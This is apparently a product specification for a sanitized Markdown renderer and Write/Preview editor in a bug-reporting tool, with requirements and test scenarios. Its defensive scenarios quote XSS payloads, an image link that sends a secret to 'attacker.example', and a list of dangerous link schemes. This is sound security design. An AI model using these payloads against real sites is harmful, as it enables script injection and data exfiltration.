# Spec Delta

## Purpose

Defines one safe, GitHub-flavoured Markdown display and Write/Preview editing behavior shared by every role that shows Reporter-authored text, so all roles see the same output.

## ADDED Requirements

### Requirement: MDR-01 Supported Markdown subset

The renderer SHALL display headings, paragraphs, emphasis, strikethrough, ordered and unordered lists, blockquotes, inline code, fenced code blocks, tables, thematic breaks, links and autolinks using GitHub-flavoured Markdown semantics. Task-list items SHALL render as disabled checkboxes that cannot be toggled. Headings SHALL NOT receive generated element IDs.

#### Scenario: Common report formatting
- **WHEN** source contains a heading, a numbered list, a fenced code block and a two-column table
- **THEN** each renders as the corresponding semantic element
- **AND** code block content is shown verbatim, without interpreting Markdown inside it

#### Scenario: Task list is not interactive
- **WHEN** source contains `- [x] done` and `- [ ] todo`
- **THEN** two disabled checkboxes render and clicking them changes neither the display nor the source

### Requirement: MDR-02 Raw HTML is never interpreted

Raw HTML in the source, inline or as a block, SHALL NOT create DOM elements, attributes or event handlers. It SHALL be displayed as literal text.

#### Scenario: Script and event-handler markup
- **WHEN** source contains `<script>alert(1)</script>`, `<img src=x onerror=alert(1)>` and `<iframe src="https://example.com">`
- **THEN** no script, img or iframe element exists in the rendered output, and no handler runs
- **AND** the markup appears as visible literal text

### Requirement: MDR-03 Images are never loaded

Markdown image syntax SHALL NOT produce an image element or any network request. The renderer SHALL show the image's alt text as plain text.

#### Scenario: Image used to exfiltrate data
- **WHEN** source contains `![logo](https://attacker.example/p.png?leak=secret)`
- **THEN** no img element is rendered and no request is made to that URL
- **AND** the text `logo` is shown

### Requirement: MDR-04 Restricted links

Only absolute `http:`, `https:` and `mailto:` URLs SHALL render as links, each with `rel="noopener noreferrer nofollow"`. Every other scheme or a relative URL SHALL render as its plain link text without a link element.

#### Scenario: Allowed link
- **WHEN** source contains `[docs](https://example.com/a)`
- **THEN** a link to `https://example.com/a` renders with the required `rel` value

#### Scenario: Dangerous or relative link
- **WHEN** source contains links using `javascript:`, `data:`, `vbscript:`, `file:` or a relative path, in any letter case or with leading whitespace
- **THEN** no link element is rendered and only the link text is shown

### Requirement: MDR-05 Failure-safe rendering

When source cannot be rendered, for example because of pathological nesting, the renderer SHALL display the complete source as escaped plain text instead of failing, hiding content or freezing the page.

#### Scenario: Pathological input
- **WHEN** source is 20,000 characters of nested blockquote and list markers
- **THEN** the view finishes rendering in under one second in the test environment, either formatted or as escaped plain text
- **AND** surrounding page content remains usable

### Requirement: MDR-06 Write and Preview editing

The editor SHALL offer accessible Write and Preview tabs. Write SHALL edit the raw source. Preview SHALL render the current source with the same renderer and settings used by every role's display. Switching tabs SHALL never modify the source. An empty source SHALL preview as "Nothing to preview".

#### Scenario: Preview matches what other roles see
- **GIVEN** a Reporter types source S in Write
- **WHEN** they switch to Preview
- **THEN** the preview output equals the output of the shared display for S
- **AND** switching back to Write shows S unchanged, with the cursor in the textarea

#### Scenario: Keyboard and screen-reader access
- **WHEN** a keyboard user moves between the tabs
- **THEN** the tabs expose tab and tabpanel roles, the selected state, and are operable with arrow keys and Enter/Space

### Requirement: MDR-07 Consistent rendering across roles

Every Reporter, Developer and Maintainer view that displays the Reporter-authored `description`, `reproductionSteps`, `expectedBehavior`, `actualBehavior` or `environment` SHALL use the shared renderer. Titles and all other text SHALL remain escaped plain text.

#### Scenario: Same source, same output in every role
- **GIVEN** a report whose description contains a list, a table and `<b>x</b>`
- **WHEN** the Maintainer browser and the Developer source panel display it
- **THEN** both show the same formatted list and table, and the literal text `<b>x</b>`

#### Scenario: Title stays plain text
- **WHEN** a title contains `**bold**`
- **THEN** every role shows the literal asterisks
